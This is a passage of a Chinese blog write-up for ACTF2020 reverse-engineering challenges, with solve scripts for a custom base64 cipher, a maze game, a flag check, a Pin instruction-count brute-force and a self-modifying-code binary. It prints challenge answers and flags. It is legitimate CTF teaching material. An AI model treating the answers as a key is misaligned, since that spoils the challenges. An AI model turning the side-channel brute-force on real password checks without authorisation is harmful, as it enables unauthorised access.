class="string">"%s\n"</span>,<span class="built_in">array</span>);</span><br><span class="line">    <span class="comment">//printf("%s\n",array_1);</span></span><br><span class="line">    <span class="comment">//printf("%s\n",array_2);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>然后是密文大小写互换</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">enced = [<span class="number">0x7A</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x4C</span>, <span class="number">0x78</span>, <span class="number">0x4A</span>, <span class="number">0x68</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x5A</span>, <span class="number">0x6E</span>, <span class="number">0x32</span>, <span class="number">0x66</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x59</span>, <span class="number">0x43</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x32</span>, <span class="number">0x6C</span>, <span class="number">0x39</span>]</span><br><span class="line">chipertext = <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> enced])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> chipertext</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap uppercase and lowercase</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swapUL</span><span class="params">(buf)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> buf:</span><br><span class="line">        c = ord(i)</span><br><span class="line">        <span class="keyword">if</span> c &lt; <span class="number">97</span> <span class="keyword">or</span> c &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> c &lt; <span class="number">65</span> <span class="keyword">or</span> c &gt; <span class="number">90</span>:</span><br><span class="line">                tmp += i</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp += chr(c+<span class="number">0x20</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += chr(c<span class="number">-0x20</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">newc = swapUL(chipertext)</span><br><span class="line"><span class="keyword">print</span> newc</span><br></pre></td></tr></table></figure></div><p>最后进行<code>base64</code>解密</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">"ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"><span class="keyword">print</span> table</span><br><span class="line"></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> newc:</span><br><span class="line">    l.append(table.index(i))</span><br><span class="line"><span class="comment"># print l</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">    s += b</span><br><span class="line">    <span class="comment"># print(b)</span></span><br><span class="line"><span class="comment"># print s</span></span><br><span class="line"></span><br><span class="line">h = hex(int(s,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="comment"># print h</span></span><br><span class="line"><span class="keyword">print</span> h.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></div><h2 id="oruga"><a href="#oruga" class="headerlink" title="oruga"></a>oruga</h2><ul><li><p>题目描述：</p><blockquote><p>“只要我们不停下脚步，道路就会不断延伸……”<br>“团长，你在做什么啊团长！”<br>“我们不需要最后的落脚处，只要不断前进就行了。只要不停止，道路就会不断延伸。因为，我不会停下来的！只要你们不停下来，那前面一定就有我！所以啊……不要停下来啊……”</p></blockquote></li><li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/oruga/oruga" target="_blank" rel="noopener">oruga</a></p></li><li><p>考察点：逆向分析</p></li><li><p>难度：简单</p></li><li><p>分值：100</p></li><li><p>完成人数：1</p></li></ul><p>走迷宫的小游戏，只要逆出了游戏规则就简单了…(有点像是神奇宝贝绿宝石里面那个溜冰游戏：D)</p><p>游戏地图大小为16x16，如下(其中<code>.</code>代表<code>\x00</code>)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....#.......####</span><br><span class="line">...##...OO......</span><br><span class="line">........OO.PP...</span><br><span class="line">...L.OO.OO.PP...</span><br><span class="line">...L.OO.OO.P....</span><br><span class="line">..LL.OO....P....</span><br><span class="line">.....OO....P....</span><br><span class="line">#...............</span><br><span class="line">............#...</span><br><span class="line">......MMM...#...</span><br><span class="line">.......MMM....EE</span><br><span class="line">...0.M.M.M....E.</span><br><span class="line">..............EE</span><br><span class="line">TTTI.M.M.M....E.</span><br><span class="line">.T.I.M.M.M....E.</span><br><span class="line">.T.I.M.M.M!...EE</span><br></pre></td></tr></table></figure></div><h3 id="游戏规则"><a href="#游戏规则" class="headerlink" title="游戏规则"></a>游戏规则</h3><ol><li>地图中<code>.</code>(<code>\x00</code>)表示可走的路，<code>！</code>表示终点，其余的字符表示障碍物</li><li>起点为(0,0)</li><li>每次选择一个方向，一直走到遇到障碍物为止</li><li>走出上下左右任何一个边界，即判负</li><li>走到终点，赢得游戏</li></ol><p>通过输入字符表示上下左右方向，对应规则如下：</p><blockquote><p>W - Up<br>E - Right<br>M - Down<br>J - Left</p></blockquote><p>按照游戏规则走到终点即可（<code>MEWEMEWJMEWJM</code>）</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>下面分析游戏规则对应的代码：</p><p>规则1,2,5比较容易，看地图就能猜出来，规则3,4代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( !<span class="built_in">map</span>[ptr] )                           <span class="comment">// add op while map[ptr] is NULL</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">-1</span> &amp;&amp; !(ptr &amp; <span class="number">0xF</span>) )           <span class="comment">// LEFT  - not 0,16,32... (col 0)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">1</span> &amp;&amp; ptr % <span class="number">16</span> == <span class="number">15</span> )          <span class="comment">// RIGHT - not 15,31,47...(col 15)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">16</span> &amp;&amp; (ptr - <span class="number">240</span>) &lt;= <span class="number">0xF</span> )     <span class="comment">// DOWN  - not &lt;= 255 (row 15)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">-16</span> &amp;&amp; (ptr + <span class="number">15</span>) &lt;= <span class="number">0x1E</span> )    <span class="comment">// UP    - not &lt;= 15  (row 0)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    ptr += op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>其中<code>while ( !map[ptr] )</code>对应规则3，循环中的代码为边界检查，对应规则4</p><p>这题是第二周放出来的，不知道为啥没人做…</p><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><ul><li><p>题目描述：Nutshell</p></li><li><p>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/easyre/easyre.exe" target="_blank" rel="noopener">easyre.exe</a></p></li><li><p>考察点：逆向分析</p></li><li><p>难度：简单</p></li><li><p>分值：200</p></li><li><p>完成人数：2</p></li></ul><p>字符串判断部分代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )&#123;</span><br><span class="line">  <span class="comment">// buf[i]!=charset[flag[i]-1]</span></span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;buf0 + i) != charset[*(&amp;flag6_ + i) - <span class="number">1</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You are correct!"</span>);</span><br></pre></td></tr></table></figure></div><p>判断条件：<code>buf[i]!=charset[flag[i]-1]</code></p><p><code>buf</code>和<code>charset</code>都是直接给的，解<code>flag</code>即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">buf = [<span class="number">0x2A</span>, <span class="number">0x46</span>, <span class="number">0x27</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x2C</span>, <span class="number">0x22</span>, <span class="number">0x28</span>, <span class="number">0x49</span>, <span class="number">0x3F</span>, <span class="number">0x2B</span>, <span class="number">0x40</span>]</span><br><span class="line"></span><br><span class="line">charset = [<span class="number">0x7E</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf[i] == charset[flag[i]-1]</span></span><br><span class="line"><span class="comment"># print charset.index(0x7E)</span></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> buf:</span><br><span class="line">    <span class="comment"># print charset.index(i)+1</span></span><br><span class="line">    s +=  chr(charset.index(i)+<span class="number">1</span>)</span><br><span class="line">s = <span class="string">'ACTF&#123;%s&#125;'</span>%s</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></div><h2 id="SoulLike"><a href="#SoulLike" class="headerlink" title="SoulLike"></a>SoulLike</h2><ul><li>题目描述：玩魂like游戏最重要的品质就是，执着（M）</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/SoulLike/SoulLike" target="_blank" rel="noopener">SoulLike</a></li><li>考察点：逆向分析、爆破</li><li>难度：中等</li><li>分值：200</li><li>完成人数：2</li></ul><p>首先flag格式为<code>actf{xxxxxxxxxxxx}</code> (12个x)，主要代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">11</span>; ++j )</span><br><span class="line">  buf[j] = flag[j + <span class="number">5</span>];</span><br><span class="line">v3 = (<span class="keyword">unsigned</span> __int8)sub_83A(buf) &amp;&amp; v12 == <span class="string">'&#125;'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( v3 )&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"That's true! flag is %s"</span>, flag);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>sub_83A(buf)</code>这个函数贼长，汇编两万多行，不知道出题人怎么搞出来的。。。</p><p>略略的看一下，一堆的异或操作，大概的操作是：</p><ul><li>将<code>xxxxxxxxxxxx</code><strong>逐个字节</strong>、<strong>反反复复</strong>的异或，最终和下面的正确结果比对</li></ul><blockquote><p>0x7E, 0x32, 0x25, 0x58, 0x59, 0x6B, 0x35, 0x6E, 0x0, 0x13, 0x1E, 0x38</p></blockquote><p>xor太多了，于是尝试爆破，手动爆破又太累了，于是请出PIN来帮忙(滑稽)</p><h3 id="Pin指令数统计爆破"><a href="#Pin指令数统计爆破" class="headerlink" title="Pin指令数统计爆破"></a>Pin指令数统计爆破</h3><p>爆破原理：</p><blockquote><p>对于逐字节判断字符串是否正确的题目，输入正确flag与错误flag时，程序执行的指令数不同<br>因此分析程序在不同输入时，执行指令数的差异，即可可逐字节得出正确flag</p></blockquote><p>不想花时间自己写<code>pintool</code>，于是直接用pin新手教学中的<code>inscount0.so</code></p><p>爆破时是这个亚子：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./taqini.py</span></span><br><span class="line">solved: actf&#123;b0Nf|Re_LiT</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTk</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTt</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTA</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTJ</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiT!</span><br></pre></td></tr></table></figure></div><p>可能是处理器有优化，解出来的结果不唯一，因此每个结果出来都要去gdb试一下</p><p>爆破脚本如下（写的很烂…师傅门凑合看，需要下载并配置PIN）：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#configure by the user</span></span><br><span class="line">PINBASEPATH = <span class="string">"/home/taqini/ctf_tools/pin-3.11-97998-g7ecce2dac-gcc-linux"</span></span><br><span class="line">PIN = <span class="string">"%s/pin"</span> % PINBASEPATH</span><br><span class="line">INSCOUNT32 = <span class="string">"%s/source/tools/ManualExamples/obj-ia32/inscount0.so"</span> % PINBASEPATH</span><br><span class="line">INSCOUNT64 = <span class="string">"%s/source/tools/ManualExamples/obj-intel64/inscount0.so"</span> % PINBASEPATH</span><br><span class="line">INSCOUNT = INSCOUNT64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pin</span><span class="params">(passwd,filename)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        command = PIN + <span class="string">" -t "</span> + INSCOUNT + <span class="string">" -- ./"</span>+ filename + <span class="string">" ; cat inscount.out"</span></span><br><span class="line">        p = Popen(command,shell=<span class="literal">True</span>,stderr=PIPE,stdin=PIPE,stdout=PIPE)</span><br><span class="line">        output = p.communicate(input=passwd)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Unexpected error:"</span>, sys.exc_info()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    output = re.findall(<span class="string">r"Count ([\w.-]+)"</span>, output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">''</span>.join(output))</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'./SoulLike'</span></span><br><span class="line">charset=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~ '</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># append a char after right ...</span></span><br><span class="line">fix = <span class="string">'actf&#123;b0Nf|Re_LiT'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"solved: "</span>+fix </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    base = pin(fix+<span class="string">'a'</span>,filename)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        diff = abs(pin(fix+i,filename)-base)</span><br><span class="line">        <span class="keyword">print</span> i,<span class="string">"diff: %04d"</span>%diff</span><br><span class="line">        sys.stdout.write(<span class="string">"\033[F"</span>)</span><br><span class="line">        <span class="keyword">if</span> diff &gt;= <span class="number">4</span>: </span><br><span class="line">            <span class="keyword">print</span> <span class="string">'solved:(maybe)'</span>,fix+i</span><br><span class="line">    fix += i</span><br></pre></td></tr></table></figure></div><h2 id="Splendid-MineCraft"><a href="#Splendid-MineCraft" class="headerlink" title="Splendid_MineCraft"></a>Splendid_MineCraft</h2><ul><li>题目描述：<strong>S</strong>plendid <strong>M</strong>ine<strong>C</strong>raft!</li><li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/Splendid_MineCraft/Splendid_MineCraft.exe" target="_blank" rel="noopener">Splendid_MineCraft.exe</a></li><li>考察点：动态调试（后来放了hint，原来叫做自修改代码…<em>SMC self-Modifying Code</em>）</li><li>难度：中等</li><li>分值：200</li><li>完成人数：2</li></ul><p>面函数如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401080</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *part1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *part2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *part3; <span class="comment">// ST28_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+14h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1; <span class="comment">// [esp+24h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> endc; <span class="comment">// [esp+3Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">int</span> p2_0; <span class="comment">// [esp+44h] [ebp-24h]</span></span><br><span class="line">  __int16 p2_2; <span class="comment">// [esp+48h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> p3_0[<span class="number">4</span>]; <span class="comment">// [esp+4Ch] [ebp-1Ch]</span></span><br><span class="line">  __int16 p3_2; <span class="comment">// [esp+50h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> pl_0; <span class="comment">// [esp+54h] [ebp-14h]</span></span><br><span class="line">  __int16 p1_4; <span class="comment">// [esp+58h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> p1_0_; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line">  __int16 p1_4_; <span class="comment">// [esp+60h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(&amp;aS, <span class="string">"Welcome to ACTF_Splendid_MineCraft!"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(&amp;aS2, &amp;Str1);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;Str1) == <span class="number">26</span> )&#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;Str1, <span class="string">"ACTF&#123;"</span>, <span class="number">5u</span>) &amp;&amp; endc == <span class="string">'&#125;'</span> )&#123;</span><br><span class="line">        endc = <span class="number">0</span>;</span><br><span class="line">        part1 = strtok(&amp;Str1, <span class="string">"_"</span>);</span><br><span class="line">        pl_0 = *(part1 + <span class="number">5</span>);                      <span class="comment">// ACTF&#123;123456_abcdef_ABCDEF&#125;</span></span><br><span class="line">                                                  <span class="comment">// 01234567890123456789012345</span></span><br><span class="line">        p1_4 = *(part1 + <span class="number">9</span>);</span><br><span class="line">        p1_0_ = *(part1 + <span class="number">5</span>);</span><br><span class="line">        p1_4_ = *(part1 + <span class="number">9</span>);</span><br><span class="line">        part2 = strtok(<span class="number">0</span>, <span class="string">"_"</span>);</span><br><span class="line">        p2_0 = *part2;</span><br><span class="line">        p2_2 = *(part2 + <span class="number">2</span>);</span><br><span class="line">        part3 = strtok(<span class="number">0</span>, <span class="string">"_"</span>);</span><br><span class="line">        *p3_0 = *part3;</span><br><span class="line">        p3_2 = *(part3 + <span class="number">2</span>);</span><br><span class="line">        ptr = func;</span><br><span class="line">        <span class="keyword">if</span> ( func(&amp;pl_0) )&#123;</span><br><span class="line">          v5 = SBYTE2(p1_0_) ^ SHIBYTE(p1_4_) ^ p1_0_ ^ SHIBYTE(p1_0_) ^ SBYTE1(p1_0_) ^ p1_4_;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0x100</span>; i &lt; <span class="number">0x1F0</span>; ++i )</span><br><span class="line">            loc_405018[i] ^= 